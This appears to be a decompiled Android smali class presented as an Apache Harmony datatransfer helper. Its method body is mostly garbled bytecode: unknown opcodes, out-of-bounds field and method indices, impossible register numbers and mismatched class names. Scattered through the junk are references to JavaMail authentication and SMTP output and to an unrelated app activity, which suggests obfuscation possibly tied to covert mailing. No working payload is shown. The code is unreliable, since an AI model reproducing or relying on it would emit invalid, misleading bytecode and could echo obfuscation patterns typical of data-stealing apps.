.class public final Lorg/apache/harmony/awt/datatransfer/b;
.super Ljava/lang/Object;
.source "Landroid/os/Parcelable;"

# interfaces
.implements Ljava/awt/datatransfer/Transferable;


# static fields
.field public static final charsetTextClasses:[Ljava/lang/Class;

.field public static final unicodeTextClasses:[Ljava/lang/Class;


# instance fields
.field private final data:Lorg/apache/harmony/awt/datatransfer/DataProvider;

.field private final flavorMap:Ljava/awt/datatransfer/SystemFlavorMap;


# direct methods
.method static constructor <clinit>()V
    .locals 6

    const/4 v5, 0x3

    const/4 v4, 0x2

    const/4 v3, 0x1

    const/4 v2, 0x0

    const/4 v0, 0x4

    new-array v0, v0, [Ljava/lang/Class;

    const-class v1, Ljava/lang/String;

    aput-object v1, v0, v2

    const-class v1, Ljava/io/Reader;

    aput-object v1, v0, v3

    const-class v1, Ljava/nio/CharBuffer;

    aput-object v1, v0, v4

    const-class v1, [C

    aput-object v1, v0, v5

    sput-object v0, Lorg/apache/harmony/awt/datatransfer/DataProxy;->unicodeTextClasses:[Ljava/lang/Class;

    new-array v0, v5, [Ljava/lang/Class;

    const-class v1, [B

    aput-object v1, v0, v2

    const-class v1, Ljava/nio/ByteBuffer;

    aput-object v1, v0, v3

    const-class v1, Ljava/io/InputStream;

    aput-object v1, v0, v4

    sput-object v0, Lorg/apache/harmony/awt/datatransfer/DataProxy;->charsetTextClasses:[Ljava/lang/Class;

    return-void
.end method

.method public constructor <init>(Lorg/apache/harmony/awt/datatransfer/DataProvider;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lorg/apache/harmony/awt/datatransfer/DataProxy;->data:Lorg/apache/harmony/awt/datatransfer/DataProvider;

    invoke-static {}, Ljava/awt/datatransfer/SystemFlavorMap;->getDefaultFlavorMap()Ljava/awt/datatransfer/FlavorMap;

    move-result-object v0

    check-cast v0, Ljava/awt/datatransfer/SystemFlavorMap;

    iput-object v0, p0, Lorg/apache/harmony/awt/datatransfer/DataProxy;->flavorMap:Ljava/awt/datatransfer/SystemFlavorMap;

    return-void
.end method

.method private createBufferedImage(Lorg/apache/harmony/awt/datatransfer/RawBitmap;)Ljava/awt/image/BufferedImage;
    .locals 9

    :sswitch_data_0
    :goto_0
    :cond_0
    :cond_1
    :cond_2
    :cond_3
    :cond_4
    :cond_5
    :cond_6
    return-void

    #unknown opcode: 0x43
    nop

    #Field index out of bounds: 20827
    #iput p6, p2, field@20827
    nop

    or-int/lit8 p127, p52, -0x5d

    rem-double p123, p14, p179

    #Field index out of bounds: 57077
    #iget-boolean v8, v8, field@57077
    nop

    #Method index out of bounds: 27481
    #invoke-interface/range {p32651 .. p32843}, method@27481
    nop

    xor-long/2addr p5, p1

    #Field index out of bounds: 20981
    #sput-object p90, field@20981
    nop

    or-long p63, p101, p117

    const-wide p32, -0x913f9d76edf9b91L    # -7.059553046286657E264

    rem-int/lit16 p4, p3, 0x4729

    and-int/2addr v3, v1

    const p30, 0x1dec0111

    const/16 p146, -0x2e5f

    #Type index out of bounds: 39197
    #check-cast p208, type@39197
    nop

    and-int/2addr v5, p1

    #Field index out of bounds: 54925
    #iput-object p2, v1, field@54925
    nop

    #Field index out of bounds: 15965
    #sget-byte p40, field@15965
    nop

    #Field index out of bounds: 44932
    #disallowed odex opcode
    #iget-object-volatile p5, p5, field@44932
    nop

    #Type index out of bounds: 33763
    #instance-of v1, v2, type@33763
    nop

    move-wide v2, v5

    mul-long p242, p137, p192

    move-exception p141

    if-lt v2, v2, :cond_2

    goto :goto_1

    move-object p1, v0

    #Field index out of bounds: 16368
    #sput-object p5, field@16368
    nop

    rsub-int/lit8 p217, p156, 0x64

    #Field index out of bounds: 16274
    #sput-boolean p97, field@16274
    nop

    float-to-int p0, p5

    #unknown opcode: 0x40
    nop

    #Field index out of bounds: 4715
    #sput-byte p162, field@4715
    nop

    #Field index out of bounds: 7233
    #iget-char p2, p2, field@7233
    nop

    mul-int/lit8 p134, p230, 0x6f

    #disallowed odex opcode
    #iget-quick v3, v4, field@0x285e
    nop

    mul-double/2addr v1, p4

    #Type index out of bounds: 38079
    #check-cast p222, type@38079
    nop

    if-gtz p50, :cond_a

    xor-long p228, p98, p239

    and-int/lit16 p0, v5, 0x66a

    cmpl-float p176, p187, p100

    move-result-wide p228

    #disallowed odex opcode
    #invoke-object-init/range {p60479 .. p60697}, Ljavax/mail/PasswordAuthentication;->getUserName()Ljava/lang/String;
    nop

    if-le p2, v2, :cond_9

    #Field index out of bounds: 31972
    #disallowed odex opcode
    #iget-wide-volatile v0, p3, field@31972
    nop

    div-int p9, p213, p2

    sub-double/2addr v2, p0

    div-long p122, p227, p230

    const-wide/32 p129, -0x550d9b5a

    return p38

    #disallowed odex opcode
    #iget-object-quick p6, p2, field@0xad24
    nop

    #Method index out of bounds: 31303
    #invoke-static {}, method@31303
    nop

    aput-object p154, p181, p196

    :goto_1
    move/16 p55038, p13132

    aput p43, p230, p68

    move-result-object p0

    #Field index out of bounds: 14216
    #iget-boolean v6, p4, field@14216
    nop

    #Field index out of bounds: 53880
    #disallowed odex opcode
    #iget-volatile v8, v8, field@53880
    nop

    #Field index out of bounds: 15352
    #iget-object v5, v7, field@15352
    nop

    div-double p246, p133, p206

    array-length p4, v8

    #Field index out of bounds: 49741
    #iput-byte v7, p1, field@49741
    nop

    float-to-int v8, v1

    move-object v0, v0

    move-exception p31

    #Field index out of bounds: 8039
    #disallowed odex opcode
    #iput-volatile v0, v2, field@8039
    nop

    #disallowed odex opcode
    #invoke-virtual-quick/range {p33458 .. p33569}, vtable@51827
    nop

    if-le p3, p6, :cond_6

    rem-int/lit16 p1, p6, 0x6211

    if-gtz p4, :cond_8

    xor-int/lit16 p0, v5, 0x5220

    #Field index out of bounds: 50196
    #sget-boolean p114, field@50196
    nop

    #Field index out of bounds: 51138
    #disallowed odex opcode
    #iget-object-volatile v3, v6, field@51138
    nop

    move-object v4, v1

    aget-boolean v2, p128, v3

    int-to-byte v0, v5

    if-eqz p156, :cond_0

    and-int p169, p1, p93

    invoke-static {}, Lcom/phone2/stop/activity/b;-><init>(Lcom/phone2/stop/activity/MainActivity;)V

    #Field index out of bounds: 2441
    #sget-byte p4, field@2441
    nop

    float-to-long v5, v5

    const-wide/high16 p132, -0x6c12000000000000L

    mul-long/2addr p2, p2

    #Method index out of bounds: 53080
    #invoke-direct/range {p44636 .. p44860}, method@53080
    nop

    mul-double p84, p17, p179

    #disallowed odex opcode
    #invoke-super-quick {}, vtable@45881
    nop

    #unknown opcode: 0x3f
    nop

    aget-short p167, p193, p104

    mul-int p47, p127, p27

    if-lt p5, v6, :cond_1

    #unknown opcode: 0xff
    nop

    #Field index out of bounds: 46778
    #disallowed odex opcode
    #iput-wide-volatile v1, p3, field@46778
    nop

    xor-int/lit8 p31, p29, -0x2c

    int-to-float p3, v7

    sub-double/2addr v7, p3

    sget-boolean p206, Lcom/sun/mail/util/BASE64DecoderStream;->input_buffer:[B

    long-to-float v0, p3

    #Type index out of bounds: 28090
    #filled-new-array {}, type@28090
    nop

    #Method index out of bounds: 20530
    #invoke-virtual/range {p58903 .. p58997}, method@20530
    nop

    rem-int p145, p71, p188

    #disallowed odex opcode
    #iget-object-quick v7, p3, field@0x98c8
    nop

    #Method index out of bounds: 16557
    #invoke-interface {}, method@16557
    nop

    xor-int/2addr p1, v1

    and-int/lit16 v8, p2, 0x71b3

    float-to-double v4, v5

    #Type index out of bounds: 46680
    #filled-new-array/range {p1210 .. p1249}, type@46680
    nop

    #disallowed odex opcode
    #iget-object-quick v8, p5, field@0xda6b
    nop

    shr-int/lit8 p9, p104, -0x13

    #Field index out of bounds: 59831
    #disallowed odex opcode
    #iget-object-volatile p5, p3, field@59831
    nop

    const p107, 0x3e3c23e0

    double-to-float v0, v0

    #disallowed odex opcode
    #invoke-super-quick/range {p46714 .. p46921}, vtable@30009
    nop

    goto/32 :goto_0

    and-int/lit8 v3, p190, 0x35

    int-to-short p5, p4

    #disallowed odex opcode
    #invoke-super-quick {}, vtable@55801
    nop

    rsub-int v4, p5, -0x566a

    move-result-wide p20

    #invalid payload reference
    #sparse-switch p36, :sswitch_data_0
    nop

    aput-wide p38, p213, p179

    not-int p3, v1

    return p237

    rsub-int/lit8 p94, p30, 0x22

    if-ltz p204, :cond_5

    double-to-long v3, p0

    mul-float/2addr p3, p4

    rem-double p98, p95, p172

    add-double p187, p188, p128

    shr-int/lit8 p189, p105, -0x2e

    return-object p32

    #unknown opcode: 0x79
    nop

    if-nez p142, :cond_4

    aput-object p27, p99, p242

    #disallowed odex opcode
    #return-void-barrier
    nop

    shl-int/lit8 p146, p72, -0x6c

    #unknown opcode: 0x79
    nop

    rsub-int v8, v4, 0x5e2e

    if-ne p4, v2, :cond_3

    #Field index out of bounds: 14032
    #sput-short p0, field@14032
    nop

    rem-int p95, p164, p169

    move-result p40

    invoke-direct/range {p10928 .. p11016}, Lcom/sun/mail/smtp/SMTPOutputStream;->write([BII)V

    #Field index out of bounds: 5274
    #disallowed odex opcode
    #iput-object-volatile v8, v4, field@5274
    nop

    monitor-exit p242

    rem-double p180, p226, p156

    #Field index out of bounds: 53719
    #disallowed odex opcode
    #iput-object-volatile p0, v1, field@53719
    nop

    double-to-int p0, p5

    #disallowed odex opcode
    #invoke-super-quick {}, vtable@3134
    nop

    shr-int/2addr v6, p6

    xor-long/2addr v4, p5

    shl-long p93, p190, p32

    #Field index out of bounds: 43864
    #sput-wide p163, field@43864
    nop

    move-object/from16 p111, p32149

    #Method index out of bounds: 55979
    #invoke-static {v3, p4, p3}, method@55979
    nop

    if-gt v1, v6, :cond_7

    return p215

    throw p222

    ushr-long p188, p182, p176

    mul-int p106, p116, p198

    #Field index out of bounds: 31046
    #disallowed odex opcode
    #sget-volatile p49, field@31046
    nop

    #Field index out of bounds: 34630
    #sput-boolean p242, field@34630
    nop

    #Field index out of bounds: 46689
    #sput-char p197, field@46689
    nop
    :cond_7
    :cond_8
    :cond_9
    :cond_a
.end method

